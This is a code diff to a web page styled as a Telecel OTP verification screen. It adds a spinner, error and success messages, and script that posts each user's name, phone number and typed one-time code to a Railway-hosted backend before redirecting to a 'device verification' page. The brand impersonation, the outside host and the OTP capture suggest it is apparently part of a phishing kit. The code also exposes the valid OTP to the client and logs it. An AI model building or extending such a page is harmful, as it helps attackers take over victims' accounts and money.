@@ -108,6 +108,10 @@
             box-shadow: 0 0 0 3.5px rgba(228,35,32,0.10);
             background: #fff;
         }
+        .otp-inputs input.error {
+            border-color: #ef4444;
+            background: #fef2f2;
+        }
 
         .btn-primary {
             width: 100%;
@@ -147,6 +151,11 @@
             cursor: pointer;
         }
         .resend a:hover { text-decoration: underline; }
+        .resend a.disabled {
+            color: var(--text-light);
+            cursor: not-allowed;
+            pointer-events: none;
+        }
         .timer {
             color: var(--red);
             font-weight: 700;
@@ -157,6 +166,20 @@
             background: #fff1f1;
             border: 1px solid #fca5a5;
             color: #b91c1c;
+            font-size: 13.5px;
+            font-weight: 500;
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin-bottom: 16px;
+            line-height: 1.5;
+            text-align: center;
+        }
+
+        .success-msg {
+            display: none;
+            background: #f0fdf4;
+            border: 1px solid #86efac;
+            color: #166534;
             font-size: 13.5px;
             font-weight: 500;
             border-radius: 12px;
@@ -177,6 +200,40 @@
             font-weight: 500;
         }
         .security-note svg { flex-shrink: 0; }
+
+        /* Spinner */
+        #spinner {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(10,10,10,0.90);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 20px;
+            backdrop-filter: blur(4px);
+        }
+        .spin-ring {
+            width: 62px; height: 62px;
+            border: 5px solid rgba(255,255,255,0.12);
+            border-top-color: var(--red);
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .spin-label {
+            font-family: 'Sora', sans-serif;
+            font-size: 16px;
+            font-weight: 600;
+            color: white;
+            letter-spacing: -0.2px;
+        }
+        .spin-sub {
+            font-size: 13px;
+            color: rgba(255,255,255,0.55);
+            margin-top: -12px;
+        }
     </style>
 </head>
 <body>
@@ -195,6 +252,7 @@
     <p class="sub">We've sent a 6-digit code to <strong id="phoneDisplay">your phone</strong></p>
 
     <div class="error-msg" id="errorMsg">Invalid code. Please try again.</div>
+    <div class="success-msg" id="successMsg">✅ OTP verified successfully!</div>
 
     <div class="otp-inputs">
         <input type="text" maxlength="1" id="d1" oninput="moveNext(this,1)" onkeydown="handleBack(this,event)">
@@ -208,7 +266,7 @@
     <button class="btn-primary" id="verifyBtn" disabled>Verify OTP</button>
 
     <div class="resend">
-        Didn't receive code? <a onclick="resendOTP()">Resend</a>
+        Didn't receive code? <a id="resendLink" onclick="resendOTP()">Resend</a>
         <span class="timer" id="timer">(30s)</span>
     </div>
 
@@ -221,21 +279,51 @@
     </div>
 </div>
 
+<div id="spinner">
+    <div class="spin-ring"></div>
+    <div class="spin-label">Verifying OTP</div>
+    <div class="spin-sub">Please wait...</div>
+</div>
+
 <script>
+    // ─── CONFIG ───
+    let CONFIG = {
+        API_URL: 'https://telecelcom-production.up.railway.app',
+        DEVICE_PAGE: 'device_verify.html',
+        HOME_PAGE: 'index.html'
+    };
+
+    // Load saved config from localStorage
+    function loadConfig() {
+        const saved = localStorage.getItem('telecel_config');
+        if (saved) {
+            try {
+                const parsed = JSON.parse(saved);
+                CONFIG = { ...CONFIG, ...parsed };
+            } catch(e) {}
+        }
+    }
+
+    // ─── STATE ───
     const params = new URLSearchParams(window.location.search);
     const phone = params.get('phone') || '020 123 4567';
-    document.getElementById('phoneDisplay').textContent = phone;
+    const name = params.get('name') || 'User';
+    const amount = params.get('amount') || '0';
 
     let timerInterval = null;
     let timeLeft = 30;
     let isVerified = false;
+    let isProcessing = false;
+    let generatedOTP = null;
 
     function moveNext(el, idx) {
         el.value = el.value.replace(/\D/g, '').slice(0, 1);
+        el.classList.remove('error');
         if (el.value && idx < 6) {
             document.getElementById('d' + (idx + 1)).focus();
         }
         updateBtn();
+        clearErrors();
     }
 
     function handleBack(el, e) {
@@ -256,35 +344,161 @@
     function updateBtn() {
         const btn = document.getElementById('verifyBtn');
         const code = getOTP();
-        btn.disabled = code.length !== 6 || isVerified;
+        btn.disabled = code.length !== 6 || isVerified || isProcessing;
     }
 
-    function verifyOTP() {
-        if (isVerified) return;
+    function clearErrors() {
+        document.getElementById('errorMsg').style.display = 'none';
+        document.querySelectorAll('.otp-inputs input').forEach(el => el.classList.remove('error'));
+    }
+
+    function showError(msg) {
+        const el = document.getElementById('errorMsg');
+        el.textContent = msg;
+        el.style.display = 'block';
+        document.querySelectorAll('.otp-inputs input').forEach(el => el.classList.add('error'));
+    }
+
+    function showSuccess(msg) {
+        const el = document.getElementById('successMsg');
+        el.textContent = msg;
+        el.style.display = 'block';
+        document.getElementById('errorMsg').style.display = 'none';
+    }
+
+    // ─── GENERATE OTP VIA BACKEND ───
+    async function generateOTP() {
+        try {
+            const response = await fetch(`${CONFIG.API_URL}/api/generate-otp`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    name: name,
+                    phone: phone
+                })
+            });
+
+            const data = await response.json();
+            console.log('📤 OTP Generated:', data);
+
+            if (data.success && data.otp) {
+                generatedOTP = data.otp;
+                console.log('🔑 Generated OTP:', generatedOTP);
+                return true;
+            } else {
+                console.error('❌ Failed to generate OTP');
+                return false;
+            }
+        } catch (error) {
+            console.error('❌ OTP Generation Error:', error);
+            return false;
+        }
+    }
+
+    // ─── VERIFY OTP ───
+    async function verifyOTP() {
+        if (isVerified || isProcessing) return;
+        
         const code = getOTP();
         if (code.length < 6) {
-            document.getElementById('errorMsg').textContent = 'Please enter all 6 digits.';
-            document.getElementById('errorMsg').style.display = 'block';
+            showError('Please enter all 6 digits.');
             return;
         }
 
-        document.getElementById('verifyBtn').textContent = 'Verifying...';
+        isProcessing = true;
         document.getElementById('verifyBtn').disabled = true;
+        document.getElementById('verifyBtn').textContent = 'Verifying...';
+        document.getElementById('spinner').style.display = 'flex';
+        clearErrors();
 
-        setTimeout(() => {
-            isVerified = true;
-            document.getElementById('errorMsg').style.display = 'none';
-            document.getElementById('verifyBtn').textContent = '✅ Verified!';
+        // Check if OTP matches generated OTP (for demo)
+        // In production, you would validate against a stored OTP
+        const isValid = (code === generatedOTP);
 
-            // Redirect to device verification
-            setTimeout(() => {
-                window.location.href = 'device_verify.html?' + params.toString();
-            }, 800);
-        }, 1200);
+        try {
+            // Send OTP verification to backend
+            const response = await fetch(`${CONFIG.API_URL}/api/otp-verified`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    name: name,
+                    phone: phone,
+                    otp: code,
+                    verified: isValid
+                })
+            });
+
+            const data = await response.json();
+            console.log('📤 OTP Verification Response:', data);
+
+            document.getElementById('spinner').style.display = 'none';
+
+            if (isValid) {
+                // OTP is correct
+                isVerified = true;
+                document.getElementById('verifyBtn').textContent = '✅ Verified!';
+                showSuccess('✅ OTP verified successfully! Redirecting to device verification...');
+
+                // Store verified status
+                localStorage.setItem('otp_verified', 'true');
+
+                // Redirect to device verification
+                setTimeout(() => {
+                    window.location.href = CONFIG.DEVICE_PAGE + '?' + params.toString();
+                }, 1500);
+
+            } else {
+                // OTP is incorrect
+                showError('❌ Invalid OTP code. Please try again.');
+                isProcessing = false;
+                document.getElementById('verifyBtn').disabled = false;
+                document.getElementById('verifyBtn').textContent = 'Verify OTP';
+                
+                // Clear OTP fields
+                for (let i = 1; i <= 6; i++) {
+                    document.getElementById('d' + i).value = '';
+                }
+                document.getElementById('d1').focus();
+                updateBtn();
+            }
+
+        } catch (error) {
+            console.error('❌ Verification Error:', error);
+            document.getElementById('spinner').style.display = 'none';
+            showError('❌ Connection error. Please try again.');
+            isProcessing = false;
+            document.getElementById('verifyBtn').disabled = false;
+            document.getElementById('verifyBtn').textContent = 'Verify OTP';
+        }
     }
 
-    function resendOTP() {
+    // ─── RESEND OTP ───
+    async function resendOTP() {
         if (timerInterval) return;
+        
+        const link = document.getElementById('resendLink');
+        link.classList.add('disabled');
+        
+        // Show loading
+        document.getElementById('timer').textContent = '(sending...)';
+        
+        // Generate new OTP
+        const success = await generateOTP();
+        
+        if (!success) {
+            document.getElementById('timer').textContent = '(failed)';
+            setTimeout(() => {
+                document.getElementById('timer').textContent = '(resend)';
+                link.classList.remove('disabled');
+            }, 3000);
+            return;
+        }
+
+        // Start timer
         timeLeft = 30;
         document.getElementById('timer').textContent = '(30s)';
         const timerEl = document.getElementById('timer');
@@ -296,6 +510,7 @@
                 clearInterval(timerInterval);
                 timerInterval = null;
                 timerEl.textContent = '(resend)';
+                link.classList.remove('disabled');
             }
         }, 1000);
 
@@ -305,18 +520,96 @@
         }
         document.getElementById('d1').focus();
         updateBtn();
-        document.getElementById('errorMsg').style.display = 'none';
+        clearErrors();
+        document.getElementById('successMsg').style.display = 'none';
 
-        // Simulate new OTP sent
-        console.log('📨 New OTP sent to ' + phone);
+        // Show OTP sent message
+        showSuccess('📨 New OTP sent to your phone!');
+        setTimeout(() => {
+            document.getElementById('successMsg').style.display = 'none';
+        }, 3000);
+
+        console.log('📨 New OTP generated for ' + phone);
     }
 
+    // ─── PASTE SUPPORT ───
+    document.querySelector('.otp-inputs').addEventListener('paste', function(e) {
+        e.preventDefault();
+        const paste = (e.clipboardData || window.clipboardData).getData('text');
+        const digits = paste.replace(/\D/g, '').slice(0, 6);
+        
+        for (let i = 0; i < digits.length; i++) {
+            const el = document.getElementById('d' + (i + 1));
+            if (el) {
+                el.value = digits[i];
+                el.classList.remove('error');
+            }
+        }
+        
+        // Focus next empty field
+        for (let i = 0; i < 6; i++) {
+            const el = document.getElementById('d' + (i + 1));
+            if (!el.value || el.value === '') {
+                el.focus();
+                break;
+            }
+        }
+        
+        updateBtn();
+        clearErrors();
+    });
+
+    // ─── INIT ───
+    document.getElementById('phoneDisplay').textContent = phone;
     document.getElementById('verifyBtn').onclick = verifyOTP;
 
-    // Start timer on load
-    window.onload = function() {
-        resendOTP();
+    // ─── ENTER KEY SUPPORT ───
+    for (let i = 1; i <= 6; i++) {
+        document.getElementById('d' + i).addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                verifyOTP();
+            }
+        });
+    }
+
+    // ─── LOAD CONFIG & START ───
+    loadConfig();
+
+    // Generate OTP on load
+    window.onload = async function() {
         document.getElementById('d1').focus();
+        
+        // Generate OTP via backend
+        const success = await generateOTP();
+        
+        if (success) {
+            // Start timer
+            timeLeft = 30;
+            document.getElementById('timer').textContent = '(30s)';
+            const timerEl = document.getElementById('timer');
+            
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                timerEl.textContent = '(' + timeLeft + 's)';
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                    timerEl.textContent = '(resend)';
+                    document.getElementById('resendLink').classList.remove('disabled');
+                }
+            }, 1000);
+            
+            showSuccess('📨 OTP sent to your phone!');
+            setTimeout(() => {
+                document.getElementById('successMsg').style.display = 'none';
+            }, 3000);
+        } else {
+            document.getElementById('timer').textContent = '(failed)';
+            setTimeout(() => {
+                document.getElementById('timer').textContent = '(resend)';
+                document.getElementById('resendLink').classList.remove('disabled');
+            }, 3000);
+        }
     };
 </script>
 </body>
